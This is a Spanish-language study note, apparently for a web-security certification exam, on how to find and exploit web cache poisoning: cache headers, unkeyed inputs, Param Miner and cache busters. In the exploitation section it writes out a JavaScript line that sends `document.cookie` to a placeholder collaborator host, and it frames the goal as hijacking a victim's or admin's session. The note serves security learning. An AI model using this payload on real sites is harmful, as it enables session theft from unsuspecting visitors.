---
aliases:
  - to-do WCP
  - web cache poisoning to-do
tags:
  - exam/to-do
  - vuln/web-cache-poisoning
---

# Web Cache Poisoning — Qué probar en el examen

> **Fuente única** para los 3 stages (evita duplicar). Cada STAGE linkea acá.
> Técnica completa → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] · labs → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs]] · ejemplos → carpeta `examples/`.

## 🚩 Flags

> [!danger] 🚩 ¿Caché envenenable? — headers en la respuesta (`.js`/home)
> `X-Cache: hit/miss` · `X-Cache-Hits` · `Cache-Status` · `Age` · `Cache-Control` · `Vary` · `Expires`. Que alterne **`miss`→`hit`** = envenenable.
> **Recon de key:** `Pragma: x-get-cache-key` (Akamai `akamai-x-get-cache-key`) → `X-Cache-Key` = keyed vs unkeyed.

> [!tip] 💡 Gadgets que gritan WCP
> **Idioma en URL** (`/en`, `?lang=`) · **scripts con callback** (geoloc `setCountryCookie(...)` → [[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|cloaking]]) · `<script src>`/`@import` que **refleja** un header/param.

## 🎯 Stage 1 vs Stage 2

> **Misma técnica; sólo cambia a quién le robás la sesión.** El "cómo" (detección, vector, Param Miner, explotación) está abajo en **Independiente del stage**.

| Aspecto            | 🟢 Stage 1                                        | 🔴 Stage 2                                                          |
| ------------------ | ------------------------------------------------- | ------------------------------------------------------------------ |
| **Objetivo**       | entrar a la cuenta de **una víctima**             | **escalar a admin**                                                |
| **A quién le pega** | cualquiera que navegue                            | el **admin** (pasa por la home)                                    |
| **Flag extra**     | hay caché **+ víctimas navegando**                | hay caché **+ el admin navega la home**                            |
| **Qué hago**       | envenenar home/`.js` → todo visitante recibe mi JS | **lo mismo**, el que cae es el admin                               |
| **Payload**        | `document.cookie` → mi Collaborator → su sesión   | igual → **sesión del admin**                                       |
| **Extra**          | —                                                 | **targeting**: si `User-Agent` ∈ `Vary`, replicá el del admin para envenenar **su** copia |

## ♾️ Independiente del stage (el "cómo" — sirve para los dos)

### 1) Detección / cache oracle
Ver los **headers de caché** del bloque de Flags. Confirmá `miss`→`hit` y, si podés, mirá la key con `Pragma: x-get-cache-key` → [[vulnerabilities/030-web-cache-poisoning/examples/005-ver-cache-key-akamai|005]].

### 2) Encontrar el input unkeyed (el vector)
| Input | ¿Unkeyed? | Rol |
| --- | --- | --- |
| `X-Forwarded-Host` | Sí (clásico) | **Vector rey** — reflejado en `<script src>`/import |
| `X-Forwarded-Scheme` / `-Proto` | Suele | **Gatillo** (fuerza redirect) → se combina con XFH |
| `Cookie` | A veces | Vector solo si esa cookie es unkeyed (lab 2) |
| `User-Agent` | Casi siempre **keyed** (`Vary`) | No es vector → sirve para **targetear** a la víctima |
| `utm_content` (param) | Sí | Vector — los CDN lo excluyen a propósito |
| **puerto** del `Host` | Sí | Pisa reflexiones (`Location`) → [[vulnerabilities/030-web-cache-poisoning/examples/006-unkeyed-port|006]] |

### 3) Cómo usar Param Miner
1. Instalar del **BApp Store**.
2. Click derecho en la request → **Extensions → Param Miner → Guess headers** (o *Guess GET/POST params* / *Guess cookies*).
3. **Imprescindible para caché:** activar **"Add static/dynamic cache buster"** e **"Include cache busters in headers"** → cada prueba usa una entrada fresca y no te engaña el hit.
4. Manda cada candidato con un **valor canario** y marca los que **se reflejan**. Trae wordlist propia y halla headers **secretos** (el lab del *unknown header*).
5. **Verificás a mano:** que el input **cambie la respuesta** Y **no entre en la key** (`X-Cache: hit` o `X-Cache-Key`).

### 4) Cache buster (probar sin esperar ni ensuciar)
**HackVector** → `<@random_num(10)/>` genera un número random por envío = buster automático. Copiar y pegar:
```
Origin: <@random_num(10)/>
Accept-Encoding: gzip, deflate, cb<@random_num(10)/>
Accept: */*, text/cb<@random_num(10)/>
Cookie: cachebuster=<@random_num(10)/>
```

> [!warning] ⚠️ Quitá el buster al atacar
> La key real que piden las víctimas **no lo lleva** → primero probás con buster, después lo sacás para envenenar. → [[vulnerabilities/030-web-cache-poisoning/examples/007-unkeyed-query-string-cachebuster|007]]

### 5) Explotar
Hosteo en el **exploit server** el JS que la página envenenada importa, en el **path exacto**:
- Solve: `alert(document.cookie)`.
- Real: `new Image().src='//TU-collab/?c='+document.cookie;` → capturo la cookie → entro a la cuenta.
Luego **cacheo** (sin buster) y confirmo `X-Cache: hit` en la request limpia.

### 6) Bypassear la codificación del navegador (probar desde Repeater)
El browser **URL-encodea** solo `;`, `<`, `>`, comillas y espacios → desde el **Repeater** mandás los **bytes crudos** y llegás al gadget con el payload **literal** (por eso el testing de WCP se hace en Burp, no en el navegador).
- **Cloak con `;`:** ⚠️ **NO "ignora todo lo que sigue"** siempre — es una **discrepancia de parseo**: el **caché** suele tratar lo que va tras `;` como **parte del param excluido** (no lo keyea), y el **backend** (p. ej. Rails) lo **separa** como parámetro nuevo y le da **precedencia al último**. Hay parsers que sí truncan en `;`. → **probá ambos comportamientos** ([[vulnerabilities/030-web-cache-poisoning/examples/009-parameter-cloaking|009]]).
- ⚠️ **Cuidado con la key:** si el caché **keyea la forma codificada**, tu payload crudo (Repeater) puede **no coincidir** con lo que manda la **víctima** (que va encodeado por el browser) → mirá **normalized cache keys** en el [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|entry point]] y confirmá con `X-Cache-Key`.

### 7) Referencias
- 📁 Entry point → [[vulnerabilities/030-web-cache-poisoning/web-cache-poisoning|web-cache-poisoning]]
- 🧪 Labs → [[vulnerabilities/030-web-cache-poisoning/labs/README|labs/README]]
- 📎 Ejemplos → `001`–`011` (design flaws, recon, implementation flaws)
- 🔗 Host header → carpeta `vulnerabilities/016-host-header-injection/`
